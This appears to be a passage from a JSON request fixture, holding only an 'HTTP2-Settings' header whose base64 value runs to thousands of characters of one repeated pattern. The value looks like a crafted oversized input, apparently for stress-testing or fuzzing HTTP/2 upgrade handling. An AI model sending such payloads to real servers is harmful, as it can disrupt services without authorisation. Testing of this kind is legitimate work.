        "HTTP2-Settings": "AAAAACAIAQIIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgIBAgI